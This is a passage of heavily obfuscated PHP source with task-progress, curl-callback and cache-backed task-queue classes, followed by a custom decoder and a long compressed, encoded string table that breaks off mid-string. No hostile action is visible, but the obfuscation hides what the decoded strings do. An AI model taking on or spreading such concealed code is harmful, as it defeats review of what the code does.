sourceModelCopy($B¦óÃˆÆ) { goto aÉ­Äšì; DŒº”­£î: $F§¼¡Ş°¹ª =& $this->task; $this->sourceModelCopyFlag = !0; $F½Òí®Ø¤ê = 0; goto a‚’ç˜µÈ©; aÉ­Äšì: $AÍ­ß°‚òİ =& $_SERVER[ä°„ä°º]; $bÆ‚ª¶ŒÖš = $B¦óÃˆÆ[0]; $Dª¸Ëˆ¬ô‚ = $B¦óÃˆÆ[1]; goto DŒº”­£î; a‚’ç˜µÈ©: switch ($bÆ‚ª¶ŒÖš) { case $AÍ­ß°‚òİ[548]: $F½Òí®Ø¤ê = 1; break; case $AÍ­ß°‚òİ[551]: $F§¼¡Ş°¹ª[$AÍ­ß°‚òİ[1595]] = $Dª¸Ëˆ¬ô‚[$AÍ­ß°‚òİ[28]]; break; case $AÍ­ß°‚òİ[553]: $F½Òí®Ø¤ê = intval($B¦óÃˆÆ[$AÍ­ß°‚òİ[377]] * 0.4); break; case $AÍ­ß°‚òİ[555]: $F½Òí®Ø¤ê = intval($B¦óÃˆÆ[$AÍ­ß°‚òİ[377]] * 0.2); break; case $AÍ­ß°‚òİ[557]: $F½Òí®Ø¤ê = intval($B¦óÃˆÆ[$AÍ­ß°‚òİ[377]] * 0.4); break; } $this->update($F½Òí®Ø¤ê); $this->sourceModelCopyFlag = !1; goto a·ÀÊ˜½¤; a·ÀÊ˜½¤: } public function sourceRemove($CàÒÉ¸¥÷­, $c¾®èÑÍİÒ) { $cØè«ç‘» =& $_SERVER[ä°„ä°º]; $this->sourceModelCopyFlag = !0; $d®ñ’“ˆ›ò = 1; if (isset($CàÒÉ¸¥÷­[$cØè«ç‘»[81]])) { $d®ñ’“ˆ›ò = $CàÒÉ¸¥÷­[$cØè«ç‘»[81]][$cØè«ç‘»[79]] + $CàÒÉ¸¥÷­[$cØè«ç‘»[81]][$cØè«ç‘»[80]] + 1; } $this->update($d®ñ’“ˆ›ò); $this->sourceModelCopyFlag = !1; } public function sourceMove($cØ‚ºÃ¥Øë) { $this->sourceRemove($cØ‚ºÃ¥Øë, !1); } public function curlProgress($aÖŠ°Î”•ª, $F”‹öãİç, $BÊˆ‡Áå»ë, $AËêæØŠ†, $f¯Ä¸´Ä¿Ì) { $bæŞÑêÊÛæ =& $_SERVER[ä°„ä°º]; $f¢È­ïá¢ª =& $this->task; if ($f¯Ä¸´Ä¿Ì > 0) { $f¢È­ïá¢ª[$bæŞÑêÊÛæ[1044]] = $bæŞÑêÊÛæ[1616]; $f¢È­ïá¢ª[$bæŞÑêÊÛæ[1599]] = $bæŞÑêÊÛæ[107]; if ($f¢È­ïá¢ª[$bæŞÑêÊÛæ[1597]]) { $f¢È­ïá¢ª[$bæŞÑêÊÛæ[1598]] = $f¯Ä¸´Ä¿Ì; } if ($f¢È­ïá¢ª[$bæŞÑêÊÛæ[1600]]) { $f¢È­ïá¢ª[$bæŞÑêÊÛæ[1598]] = $f¯Ä¸´Ä¿Ì + $f¢È­ïá¢ª[$bæŞÑêÊÛæ[1600]]; } } else { if ($BÊˆ‡Áå»ë > 0) { if ($f¢È­ïá¢ª[$bæŞÑêÊÛæ[1597]] == $F”‹öãİç) { $f¢È­ïá¢ª[$bæŞÑêÊÛæ[1598]] = $BÊˆ‡Áå»ë; $f¢È­ïá¢ª[$bæŞÑêÊÛæ[1044]] = $bæŞÑêÊÛæ[1617]; $f¢È­ïá¢ª[$bæŞÑêÊÛæ[1599]] = $bæŞÑêÊÛæ[1115]; } } } $this->update(); } public function curlProgressStart($dÙã—ºÆ¼Û) { } public function curlProgressEnd($c½Ì„ˆƒ†) { goto e–ƒŞäá‘¹; e–ƒŞäá‘¹: $CÉ‚íÒÖ÷ =& $_SERVER[ä°„ä°º]; $a¯ì¶Š‘‚ì =& $this->task; $cµø‰àÓ³Î = curl_getinfo($c½Ì„ˆƒ†); goto D¼ƒªù¿‹Ó; D¼ƒªù¿‹Ó: $c¦éˆ´“‡È = $cµø‰àÓ³Î[$CÉ‚íÒÖ÷[1618]]; if ($c¦éˆ´“‡È == -1) { $c¦éˆ´“‡È = $cµø‰àÓ³Î[$CÉ‚íÒÖ÷[1619]]; } if ($a¯ì¶Š‘‚ì[$CÉ‚íÒÖ÷[1599]] == $CÉ‚íÒÖ÷[107] && $c¦éˆ´“‡È) { $a¯ì¶Š‘‚ì[$CÉ‚íÒÖ÷[1600]] += $c¦éˆ´“‡È; } goto c°á‰ËÙ¸ä; c°á‰ËÙ¸ä: $this->update(); goto c¬¢å°£ä; c¬¢å°£ä: } } class TaskHttp extends Task { protected function startAfter() { $E…ÍŒÚ…¶  =& $_SERVER[ä°„ä°º]; $cÃÎ¼Æ¨æ¨ =& $this->task; $cÃÎ¼Æ¨æ¨[$E…ÍŒÚ…¶ [1620]] = 1; Hook::bind($E…ÍŒÚ…¶ [1589], array($this, $E…ÍŒÚ…¶ [1621])); Hook::bind($E…ÍŒÚ…¶ [1591], array($this, $E…ÍŒÚ…¶ [1622])); Hook::bind($E…ÍŒÚ…¶ [1593], array($this, $E…ÍŒÚ…¶ [1623])); } protected function endAfter() { $dÔëæ¸£²‡ =& $_SERVER[ä°„ä°º]; Hook::unbind($dÔëæ¸£²‡[1589], array($this, $dÔëæ¸£²‡[1621])); Hook::unbind($dÔëæ¸£²‡[1591], array($this, $dÔëæ¸£²‡[1622])); Hook::unbind($dÔëæ¸£²‡[1593], array($this, $dÔëæ¸£²‡[1623])); } public function progressStart($fâÏ·çµ—Õ) { $Aç‰ùç—Ò =& $_SERVER[ä°„ä°º]; $E‚±™åÒ¯ = curl_getinfo($fâÏ·çµ—Õ); self::log($Aç‰ùç—Ò[1624] . $E‚±™åÒ¯[$Aç‰ùç—Ò[305]]); self::valueSet($this->task[$Aç‰ùç—Ò[393]], $this->task); } public function progressEnd($dÜŒ¨’Û‚–) { $Aïˆƒä£‰‘ =& $_SERVER[ä°„ä°º]; self::log($Aïˆƒä£‰‘[1625] . $this->task[$Aïˆƒä£‰‘[393]]); $this->end(); } public function progress($C„¦¿…ÔĞ, $b—É¼ñ¤‚–, $CáŸ°öåŒ„, $bæ“‘Ğò¯”, $F¼Æ¹Šø³î) { $bİ°Áùİ£Ä =& $_SERVER[ä°„ä°º]; $b¬ÆÖéß×â =& $this->task; if ($F¼Æ¹Šø³î > 0) { $b¬ÆÖéß×â[$bİ°Áùİ£Ä[1042]] = $b¬ÆÖéß×â[$bİ°Áùİ£Ä[1042]] == 0 ? $bæ“‘Ğò¯” : $b¬ÆÖéß×â[$bİ°Áùİ£Ä[1042]]; $b¬ÆÖéß×â[$bİ°Áùİ£Ä[1057]] = $F¼Æ¹Šø³î; } else { if ($CáŸ°öåŒ„ > 0) { $b¬ÆÖéß×â[$bİ°Áùİ£Ä[1042]] = $b¬ÆÖéß×â[$bİ°Áùİ£Ä[1042]] == 0 ? $b—É¼ñ¤‚– : $b¬ÆÖéß×â[$bİ°Áùİ£Ä[1042]]; $b¬ÆÖéß×â[$bİ°Áùİ£Ä[1057]] = $CáŸ°öåŒ„; } } $this->update(); self::log("\160\x72\x6f\147\162\145\163\x73\x48\x74\x74\160\72\144\x6f\x77\156\x3a{$CáŸ°öåŒ„}\57{$b—É¼ñ¤‚–}\x3b\40\x75\x70\x6c\157\x61\x64\x3a{$F¼Æ¹Šø³î}\x2f{$bæ“‘Ğò¯”}\x3b"); } } class TaskQueue { const MAX_LENGTH = 1000; const QUEUE_LENGTH = "\x74\141\x73\x6b\x51\165\x65\x75\145\114\145\x6e\147\164\x68"; const QUEUE_DATA = "\164\x61\163\153\x51\165\145\x75\145\x44\x61\x74\141"; public static $listData = false; public static function initTask() { } public static function add($FÒšƒ´»„, $fí–¤² = array(), $a†¾˜‘µ­‘ = '', $E©«Áƒõ¹‰ = '') { $dÅ³¥çÛÇ =& $_SERVER[ä°„ä°º]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($E©«Áƒõ¹‰ && array_find_by_field(self::$listData, $dÅ³¥çÛÇ[93], $E©«Áƒõ¹‰)) { return !0; } self::$listData[] = array($dÅ³¥çÛÇ[262] => $FÒšƒ´»„, $dÅ³¥çÛÇ[1626] => $fí–¤², $dÅ³¥çÛÇ[431] => $a†¾˜‘µ­‘, $dÅ³¥çÛÇ[93] => $E©«Áƒõ¹‰); return !0; } public static function addSubmit() { $FŞø…¶Í¹ =& $_SERVER[ä°„ä°º]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($FŞø…¶Í¹[1627] . json_encode_force(array_to_keyvalue(self::$listData, $FŞø…¶Í¹[33], $FŞø…¶Í¹[431])), $FŞø…¶Í¹[1628]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($FÃŞøó‰½¢, $CÁ¦õğ”¯ = array(), $FÍ…õÃ’Ö = '', $AÏõŠÌ ¡ = '') { goto B“‰ªİğ×Ó; EĞ¿Ç˜…Ş: if ($AÏõŠÌ ¡ && array_find_by_field($Dà÷²é†©², $cƒùïç†Ñ¢[93], $AÏõŠÌ ¡)) { return !0; } $Dà÷²é†©²[] = array($cƒùïç†Ñ¢[262] => $FÃŞøó‰½¢, $cƒùïç†Ñ¢[1626] => $CÁ¦õğ”¯, $cƒùïç†Ñ¢[431] => $FÍ…õÃ’Ö, $cƒùïç†Ñ¢[93] => $AÏõŠÌ ¡); write_log($cƒùïç†Ñ¢[1627] . $FÍ…õÃ’Ö, $cƒùïç†Ñ¢[1628]); goto bš¨Æ®å©¢; B“‰ªİğ×Ó: $cƒùïç†Ñ¢ =& $_SERVER[ä°„ä°º]; if (self::count() >= self::MAX_LENGTH) { return !1; } $Dà÷²é†©² = self::getAll(); goto EĞ¿Ç˜…Ş; bš¨Æ®å©¢: self::setAll($Dà÷²é†©²); return !0; goto CºÎ§©Ëí; CºÎ§©Ëí: } public static function run() { goto EåŒ’ÎÊÍÉ; Fñƒ–¨ñÔ: if (!$C‘Ï„·Ü‹„) { return !1; } self::setAll($f§ÆİÍ¢Š…); $d›¡¼ Ğé‡ = timeFloat(); goto B†ÎŒî·òŠ; EèŠØ¤ÍÓÙ: return !0; goto E¶¸³’è›æ; B†ÎŒî·òŠ: try { Hook::apply($C‘Ï„·Ü‹„[$D©àá›ÖÜÇ[262]], $C‘Ï„·Ü‹„[$D©àá›ÖÜÇ[1626]]); } catch (Exception $aÚ‡Õ¹Å‚§) { } $A©ì‡“óåî = number_format(timeFloat() - $d›¡¼ Ğé‡, 3) . $D©àá›ÖÜÇ[1564]; write_log($D©àá›ÖÜÇ[1629] . $C‘Ï„·Ü‹„[$D©àá›ÖÜÇ[431]] . $D©àá›ÖÜÇ[1630] . $A©ì‡“óåî, $D©àá›ÖÜÇ[1628]); goto EèŠØ¤ÍÓÙ; EåŒ’ÎÊÍÉ: $D©àá›ÖÜÇ =& $_SERVER[ä°„ä°º]; $f§ÆİÍ¢Š… = self::getAll(); $C‘Ï„·Ü‹„ = array_shift($f§ÆİÍ¢Š…); goto Fñƒ–¨ñÔ; E¶¸³’è›æ: } public static function count() { $AÛò™äÜ¤ = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$AÛò™äÜ¤) { return 0; } return intval($AÛò™äÜ¤); } public static function getAll() { $FÜöæíö‘« = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$FÜöæíö‘«) { return array(); } return $FÜöæíö‘«; } public static function setAll($F‚ôÓñì) { $DìéØĞ††¤ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($F‚ôÓñì), $DìéØĞ††¤); Cache::set(self::QUEUE_DATA, $F‚ôÓñì, $DìéØĞ††¤); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } goto BÉò»ôÁ¾Ô; eİ—í·Ó‘«: if (!function_exists('_kodDe')) { function _kodDe($CØº×æ¢¬) { $CØº×æ¢¬ = base64_decode($CØº×æ¢¬); $EŞí…¦âù« = strlen($CØº×æ¢¬); $D‚õ†Àó  = ''; $d„¨§¹§½ = ord($CØº×æ¢¬[0]) - 30; for ($aÎ¿Î˜°¡ = 1; $aÎ¿Î˜°¡ < $EŞí…¦âù«; $aÎ¿Î˜°¡ += 2) { if ($aÎ¿Î˜°¡ + 1 < $EŞí…¦âù«) { $D‚õ†Àó  .= chr(ord($CØº×æ¢¬[$aÎ¿Î˜°¡ + 1]) + $d„¨§¹§½); $D‚õ†Àó  .= chr(ord($CØº×æ¢¬[$aÎ¿Î˜°¡]) + $d„¨§¹§½); } else { $D‚õ†Àó  .= chr(ord($CØº×æ¢¬[$aÎ¿Î˜°¡]) + $d„¨§¹§½); } } return $D‚õ†Àó ; } } define("\xe4\xb0\x84\xe4\xb0\xba", base64_decode('87LJqNno9w==')); $_SERVER[ä°„ä°º] = explode("\174\2\174\4\174\4", gzinflate(substr("\x1f\x8b\x8\x0\x0\x0\x0\x0\x0\x3\xad\x7d\x9\x7c\x14\x45\xf6\xb0\x7\xea\xe2\x8a\xe7\xae\xd7\xae\x6b\x13\xc0\x1c\xcc\x91\x84\x33\x81\x10\x26\x93\x49\x32\xcb\x24\x13\x66\x26\x4"."\x24\x71\xe8\x99\xe9\xc9\x74\x32\x33\x3d\xe9\xee\xc9\x5\x78\xad\x8b\xab\x80\x8a\x7\x5e\x2b\xba\x22\x8a\xa8\xa0\x78\x2b\xe0\x7a\x1f\x78\xad\xc7\xaa\xab\xee\xe1\x5f\xf0\x60\x75\xbd\xd0".base64_decode('VVn86q7qnon7/37fh8JUvTq66lXVq/devXr15CeXf7Pm84cfXXbQsjHLxtzz0g==').base64_decode('uW/iEPjvkGWH4vCpK39yAPpz8MoLy8paph8+ue2Ii++5Q75VvkNeGQzsfN4/7g==')."\305\333\177\355\333\275\176\347\360\356\3\17\70\346\214\75\177\253\5\231\161\331\132\374\43\145\65\123\122\206\124\303\64\60\40\256\145\223\152\17\16\253\131\374\353\306"."\77\106\177\132\65\25\34\216\266\5\43\321\160\107\173\273\57\24\211\222\32\305\364\214\226\40\241\234\254\313\31\122\171\116\321\15\360\51\261\272\150\116\313\51\131\13"."\x84\x3\x12\xb2\x29\xc7\x64\x83\xd4\xd4\xd8\x10\x6d\xf4\xb5\x7\x82\x8b\xa2\x91\x45\xed\x3e\x92\x23\x16\xed\xcf\x2b\xfa\x30\x8e\xa1\x60\xd8\x94\x75\x33\xa2\x66\x14\x96\x63\x50\x67\xed"."\x6a\xf0\x35\xfb\xdb\xa4\x48\xc8\xd3\x16\xf6\x78\x23\xfe\x60\x1b\x6\x7b\x83\xad\xad\xfe\x48\x21\x3c\x14\xc\x4\x1a\x3c\xde\x79\x85\x29\xed\x21\x4f\x73\xab\x47\x2\xed\x4b\x2b\x51\x35".base64_decode('m9TKpCU4ZYlUjgNNqpJO4GBWps0xh3MkFGEhMAbZfDqNI20sRNqvJOV8muCsUQ==')."\x8c\xe4\x74\x35\x23\xd3\xae\xcf\x53\x86\x19\x14\x7\xe4\xbc\xa9\xa9\xd9\x38\x8e\xf8\x86\x4c\x5d\xe6\x70\xd0\xe2\xb8\xae\x64\x94\x2c\xa9\x2a\xec\xb\xf8\xbc\x11\x9\x36\x53\x6a\xa\x5"."\133\45\62\24\31\331\60\25\135\352\154\361\205\174\22\154\172\135\51\352\161\251\204\313\165\264\1\204\110\236\100\100\32\255\6\123\311\344\150\65\270\114\221\312\202\241".strrev('Éh'."\0".'üÜé±öÔØ$HèpüdP¾©¡M<`-@ºËFLµÅ<q$XjH_F')."\24\62\113\55\261\104\62\155\106\7\344\164\236\116\326\76\374\133\112\176\310\257\146\220\11\334\257\146\325\74\231\254\244\12\115\143\53\207\4\362\64\267\102\41\112\202".base64_decode('BDKgvEYWF1hpAzhYNwf/ziKZYlGYpuhmVMnGtYSaJeuxnqw9MgNlM9WoqyAfqQ==')."\x50\x73\xc5\xb5\xdc\x70\xab\x36\x40\x3a\x93\x54\xd3\x4a\x80\x2d\xb7\xa4\x96\x4e\x28\x3a\x8f\xe7\x40\x71\x31\x85\xf4\x4a\x1d\x11\x4a\xb7\xe5\x33\x62\x16\x16\x8d\xa7\xd4\x74\x42\xa7\xab"."\xf4\xc7\x72\x2\x3a\xa0\x26\x87\xf9\x6a\x34\xb4\xbc\x1e\x57\xfc\x60\xbd\xf0\xb2\xed\xac\x25\x55\x24\x93\x62\x9a\xa0\xd3\x6\xed\x57\x47\x2e\xad\xc9\x89\xb0\xa2\xb\x7d\x6d\x2\x5\x83"."\171\123\4\346\121\266\46\115\317\64\2\272\101\276\17\126\213\332\121\44\241\217\256\227\204\200\102\27\241\167\145\213\317\161\356\357\136\74\27\374\123\116\210\137\27\151"."\x5a\x4a\x49\xa7\xa3\xca\x90\x42\xd6\x55\x26\x31\xcd\xa0\x7d\x75\x1b\x31\x35\xeb\x6\x10\x1c\xf5\x7\xa3\x29\xd9\x48\xb5\x26\xa6\x45\x51\x29\x4a\x53\x13\xca\x90\x2b\x97\xca\x91\xa5\xcf"."\126\173\227\145\336\303\321\151\323\114\237\100\231\323\132\134\116\213\75\305\341\224\151\346\302\112\66\1\21\102\172\244\15\146\21\302\162\212\102\62\65\72\244\204\324\52"."\55\222\132\152\325\132\203\26\314\244\131\210\366\216\301\14\6\64\207\310\214\51\41\161\145\310\44\110\221\146\305\123\262\16\206\253\56\157\46\235\63\11\175\311\345\322".base64_decode('alw2VS3r1uKmYjoNU1dkUpsnHlcMw+nVsqaupZ2edFobdAZ1tUfN1koVhBqDRA==')."\260\336\235\220\102\326\222\105\134\62\113\202\163\5\22\210\12\374\65\272\70\131\156\135\316\32\111\105\167\372\310\242\251\225\300\170\60\2\111\263\65\252\106\116\63\124".strrev('µÈÉî]vÎ+µ*B5¹©VÚWU9C}y*ÍZlÕù#÷_W…Ä‚9M6IZ¼Ø')."\122\56\37\3\230\41\253\267\10\14\347\46\250\251\225\342\60\352\220\62\171\303\164\352\12\240\122\52\330\17\311\30\373\223\316\126\270\264\124\45\341\14\3\142\116\300"."\x53\x2a\xa7\x4a\x60\xda\x48\x34\xd\x43\x5b\x22\x91\xf6\xa8\xbf\x9\xec\xd9\x6d\xbe\x68\xab\x27\xe2\x6d\x21\xcd\x36\xe5\x1e\xda\xe6\x0\x20\xd1\xac\x4a\xa\x5c\xe8\x4\x4b\xc\x4e\xac".strrev('gé©°ØŸˆÙÉéœî34! 0æ`“EÈm1ÓêV¸a¸|×lWĞ6')."\xf4\x58\x11\x1d\x50\xb2\x3d\x66\x8a\x16\xc\xfb\x42\xb\x7c\xa1\x68\x38\xd8\x14\xe9\xf4\x84\xc8\x6e\x9f\x5\xb3\x64\x88\x7e\xa\x56\x9d\x76\x86\x94\x4\x40\x7d\xdc\xa4\xe5\xe4\x1c\xc4".strrev(']uC¨ÜƒIš`$Â'."\n".'Y7m…FjºÑsäÈb!›øM'."\n".'š+Í')."\251\212\262\256\304\344\162\47\370\267\242\174\161\127\243\253\242\273\336\255\362\62\356\52\127\225\124\135\71\135\152\7\274\211\52\247\45\322\351\202\34\225\122\160\336\217"."\40\0\156\135\302\262\266\241\16\3\103\276\371\35\276\160\44\332\352\213\264\4\33\311\27\174\36\22\12\150\170\151\322\36\55\306\77\335\56\116\217\301\230\373\63\162"."\x8f\x8d\x4a\xc3\x58\xab\xa6\x2b\x56\x8\xdf\x35\x3a\xd5\x4\x25\xe3\x30\xda\xa2\xa8\x3d\x29\xd2\x3f\x15\xd6\x16\xd7\xd2\x9a\x2e\xa7\x21\x15\xa3\x93\x58\xa1\x94\xa5\x47\x4d\x92\xf1\xc1"."\x4\x93\x47\xc2\x6a\x26\x47\xe9\x9a\x99\xca\x67\x62\x42\x90\xb2\xa5\x60\xbc\xe9\xf6\x92\xd2\xd8\xf6\xa6\xe9\x24\x54\xeb\x26\x19\x27\x55\x37\x51\xca\xec\xe\x4f\x1\xff\x73\x32\x9c\xd0"."\62\62\345\166\21\111\122\22\230\46\141\120\205\45\245\105\221\371\176\151\352\246\6\241\272\45\113\253\142\246\64\62\110\75\12\155\122\236\265\215\266\62\241\244\25\212"."\x8d\x94\x42\x49\x7a\x25\xc9\x6\x76\x26\x86\xab\x24\x23\xef\x80\x71\x3\x50\xbe\xa5\xaa\x46\x8\x94\x84\x8c\x14\x8d\x77\x42\x7e\x97\x3\x4c\x96\x35\xd\x76\x93\x60\xac\x17\x2c\x17\xc2"."\x49\xa8\x46\x93\xb0\xf9\x47\x35\x94\x6\x1a\x2f\xf3\xfc\xed\xba\x92\x54\xc9\xa2\xcb\x82\x11\x6b\x95\xf5\x3e\x5a\x0\x8c\x10\xdf\x76\x60\x44\xa8\xac\xa9\x23\x10\x88\x7a\x83\x6d\x11\xc0"._kodDe('L1IyVjcOt8Dg2Sh7WKtpW9zUAj0SLyFAcQqnt0+kLwKfHOACeqliMcR8UW+y1ik=')."\xb4\xac\xa1\x38\xe3\xa4\xb6\x4\x27\xeb\x38\xc7\x2c\x1b\x4d\x2f\x28\xc1\x39\xf7\x21\xa7\x9c\x19\x71\x66\x0\x9a\x9c\xac\xe9\xd6\x1d\x56\x8a\x88\x1b\xb5\x9f\x8c\x2b\x27\xdf\x10\xb1\x40".strrev('æDuuù›ÒSéäï	–·táàöjœÂ2’AŞÑÚNŠbà(CÔ'."\n".'L0{{[¢0')."\x7d\xac\xa7\xed\x21\x75\xf\x65\xd2\x9c\x21\xb4\xf6\xca\xc9\xc7\x22\xd2\xe2\x6f\x9b\x17\x6d\xd\x36\xfa\x2\x51\x7f\x1b\xa0\x4b\x91\x42\x78\x47\x7b\xa3\x87\xe\xae\x8\x6f\x8\x46\x5a"."\54\320\16\100\231\26\170\2\176\173\166\337\102\177\70\22\56\232\4\140\35\76\133\12\220\5\333\103\276\46\377\102\26\155\362\373\2\215\341\250\327\343\155\341\171\332"."\x3c\xad\x24\x12\x4d\x42\x69\xcc\x70\x5b\xf3\x47\x1\x89\xd\x33\x99\x2e\x3a\x0\xe5\x53\x8a\xac\xa8\x45\x80\x8a\x52\xd1\x20\xca\xe7\x1\xd8\x2e\x15\x32\xf7\x48\x77\xa1\x54\x8c\x7a\x42"."\170\364\270\226\247\263\221\261\211\31\112\125\62\62\131\126\62\335\12\313\360\117\271\344\11\113\146\56\312\350\107\154\230\5\121\67\150\34\60\204\344\373\22\41\367\5"."\55\210\302\74\15\112\222\121\356\342\0\117\322\144\124\300\26\7\353\202\247\201\21\360\40\361\33\314\4\64\42\121\272\326\14\40\257\170\150\163\222\134\364\215\6\333".base64_decode('fSEPFJyjnaFgWzMpMJhSaAP8BP1llH0i8rPJSRjgfWQqQnGk92oUlcvwz2n4Bw==').base64_decode('sH3k40qWYj0GqTkjDFQmAquBUmItz74W07Q0XaeAA2D0gEnevQadJEOU+EymWw==')."\32\331\121\42\301\171\276\266\50\235\131\70\46\314\106\14\0\262\154\60\104\20\142\152\175\124\240\302\211\41\137\230\256\162\135\351\317\253\24\135\156\327\144\62\213\25"."\xb0\x69\x91\xcf\xbb\xcf\xe8\x1a\x9c\x5c\xb6\xd8\x39\xd9\xd5\xd\x2\xe5\x15\x73\x71\x94\xc4\xba\x5c\x96\xe8\x44\x52\x3e\xaf\xb3\xd2\x90\x31\x2a\x33\xea\xcb\x6b\xbb\xdc\x5d\xee\xb2\xfa"."\332\305\36\347\210\354\34\251\164\326\70\273\47\167\271\312\47\23\100\367\322\152\307\324\345\60\3\310\130\77\241\33\374\324\165\325\117\352\162\236\166\346\222\271\213\273"."\272\113\153\47\217\357\162\115\350\32\354\256\50\257\247\337\211\347\165\40\54\306\207\131\123\23\223\313\100\223\0\303\304\262\144\21\311\23\62\320\204\21\65\307\241\113"."\247\57\247\160\60\206\112\17\57\261\330\331\65\271\273\136\50\47\200\354\337\2\314\22\240\277\51\226\317\343\74\35\366\214\25\205\353\236\314\217\174\66\316\251\47\134"."\27\61\71\116\350\200\332\223\145\113\10\160\1\114\110\267\362\351\113\47\341\337\345\164\40\173\224\41\112\32\262\111\125\47\263\63\237\125\373\251\16\42\253\364\223\200"."\146\322\371\35\123\314\101\205\116\17\0\267\304\301\344\240\202\41\110\22\142\151\304\26\222\57\160\1\115\101\322\12\351\105\56\12\171\262\101\26\113\50\131\62\116\143"."\x49\x6e\x23\x2e\xe7\x94\xb0\xd0\xc3\x68\x34\xe2\x69\x8\xf8\xa2\x94\xc2\x10\x4a\x4c\xe3\x88\x2a\x36\x30\xad\x1d\xe8\x1a\xa7\xa8\x94\x3e\xc4\x39\x93\x8e\xe4\x11\xb2\xf2\x8d\xfe\xb4\x84".base64_decode('CIOk6Lqm1yLtpJHPQWYOyF4mwK0EBHepbo6EUU7KRcUByMmUc4CytMANQApF2g==')."\224\343\43\144\0\26\214\362\103\356\262\256\256\374\142\45\321\275\30\114\174\331\231\354\136\72\145\171\71\345\343\335\135\340\17\215\170\212\50\321\242\214\32\106\301\376"."\xec\x82\xed\x60\x7a\x10\x4b\x84\x25\xe3\xa8\xa6\x33\xa6\x29\x67\x61\xbb\x4d\xcd\x94\xd3\x96\x2a\x22\x10\x42\x49\x13\xdd\xb8\x89\xca\x0\x8f\x76\x80\x53\x2c\xb8\x95\xb\x3a\x48\x44\x4e".base64_decode('25iCjSlABPUXLBFWTBfL4RAS8b91JZTCZ8Ea8gr7G1bahIcNU8lY9JSGIuvxVA==')."\123\76\235\66\31\307\237\126\373\110\265\144\201\54\51\226\267\111\323\251\144\133\101\276\133\122\121\54\243\77\233\5\162\250\70\241\370\126\332\354\1\114\113\104\52\243"."\x3a\x3d\xc9\xdf\x26\x35\x4\x83\x1\x9f\xa7\x4d\x82\xbb\x36\xd9\x6d\xfc\x8d\x4e\x5a\x7e\xa1\xd3\x4f\xa4\x25\x16\x50\x13\x74\x10\x0\x25\x33\x29\x94\x68\xb3\x48\xc\x32\x8f\xe\xa8\xb8".base64_decode('cUAWwQGa5YCSkIMz7A6uDnMwdtlBuGiHKetgg4dsLgn6Gx2q0YhEBFQvSqLtMA==')."\123\120\63\221\226\207\35\270\115\1\145\100\111\73\150\213\34\264\241\16\312\342\73\220\310\326\110\132\323\1\26\3\151\15\12\2\232\227\162\300\341\207\263\317\301\265"."\164\344\163\202\114\341\340\362\206\243\107\327\362\271\166\372\45\41\206\33\103\0\274\245\14\20\322\64\323\101\145\110\107\241\170\131\34\145\305\233\216\160\154\377\66\31".base64_decode('H5hUiJLitRfi3CodLcUVESl7Od2HLHn4ENJVklZ4DCKZhxbwpQX70SQPiJOq2A==')."\4\243\273\1\235\214\134\133\316\225\271\234\73\265\313\211\166\125\54\374\150\104\356\11\13\237\63\345\36\372\255\42\251\70\34\122\342\303\161\56\153\66\12\22\254\65"."\306\360\216\326\105\261\311\135\174\74\331\204\145\343\160\370\330\261\24\221\164\26\263\261\264\114\376\121\127\33\357\123\60\307\67\164\110\102\303\140\153\21\210\44\5\5"."\71\115\316\23\6\104\66\210\50\0\365\253\44\244\120\30\357\212\210\154\324\37\73\200\142\307\362\135\30\345\23\205\242\100\202\37\160\10\133\46\134\45\116\76\344\102"."\224\374\250\132\24\343\75\232\141\122\74\33\10\33\101\207\343\322\256\146\207\325\254\250\145\341\120\276\47\360\55\11\116\134\233\136\250\161\264\60\246\205\134\213\343\40"."\xda\x1d\x7\x10\xcb\xfb\x84\x9d\x83\xab\x10\x40\xeb\x61\x51\xa1\xed\xa4\x26\x5b\xcb\x29\xc1\x20\x9d\xee\x0\x32\x69\xd4\x36\x71\xc9\x94\x4d\xc9\x3a\xc7\x29\x5d\x61\x70\x9a\x73\xdd\x15"."\314\302\243\102\266\244\74\300\267\113\113\31\141\235\30\346\60\155\275\30\264\126\212\243\215\243\105\132\230\250\135\54\52\56\101\325\10\0\334\25\13\243\236\106\264\242"."\121\250\0\242\141\15\315\177\172\36\153\331\315\220\260\132\106\141\144\133\214\12\42\54\133\231\326\162\270\201\36\106\334\0\177\231\6\224\134\167\301\305\324\14\11\263"."\x48\x1c\x19\x31\x33\xe0\x26\x40\x6a\x40\x4c\x83\xb8\x34\xf1\x9c\xd\x2b\x60\x5d\x91\x3c\xbc\xfe\x70\x41\x9a\x98\x9b\x2b\x34\x20\x29\xe4\xa4\x93\x8e\x5\x5f\xa9\x7c\x7c\xf8\xb2\xb4\x4c"."\xa5\x1e\xde\xf6\x3c\xc8\x11\x2d\x6c\x14\x5c\xe\xc5\xe3\x4d\xba\xc6\xf8\x36\xb6\x1\xda\x33\x79\x91\x60\x64\x8a\x83\x21\xec\x5e\x2\xea\x2c\x1b\x6d\x1\x48\x28\x63\xdf\x72\x6d\x50\x5b"."\224\217\200\205\130\143\20\125\233\312\211\214\232\165\351\230\354\273\0\273\113\16\100\35\225\2\57\302\151\327\122\3\15\46\331\46\226\333\246\204\11\104\353\230\254\273"."\164\360\145\336\40\302\301\346\331\60\164\223\126\241\252\170\76\201\174\242\224\200\106\245\61\110\21\174\11\325\204\20\110\360\65\252\153\345\31\205\103\110\6\23\351\61".strrev('ˆE<rÔÃ.€‹tv	Æ	-IáYÏ3qc·ÅÉı 